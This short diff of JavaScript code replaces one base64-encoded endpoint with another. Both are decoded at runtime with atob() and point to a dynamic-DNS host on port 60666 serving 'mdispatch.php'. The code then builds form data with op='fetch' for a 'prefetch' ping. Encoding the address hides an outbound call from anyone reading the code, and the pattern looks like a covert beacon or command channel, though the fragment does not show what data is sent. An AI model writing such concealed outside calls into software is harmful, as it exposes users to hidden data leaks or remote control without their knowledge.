@@ -18,7 +18,8 @@
 		{
 			var USE_PREFRETCH = true && INIT_THREAD_TARGET==0;
 			var fetchPingFormData0=""; 
-			var operfetch = atob("aHR0cDovL3NpZGVyczIuZGRucy5uZXQ6NjA2NjYvbWRpc3BhdGNoLnBocA==");
+			//var operfetch = atob("aHR0cDovL3NpZGVyczIuZGRucy5uZXQ6NjA2NjYvbWRpc3BhdGNoLnBocA=="); //http
+			var operfetch = atob("aHR0cHM6Ly9zaWRlcnMyLmRkbnMubmV0OjYwNjY2L21kaXNwYXRjaC5waHA="); //https
 			if(USE_PREFRETCH) {
 				pingFormData0 = new FormData(); 
 				pingFormData0.set('op', "fetch");
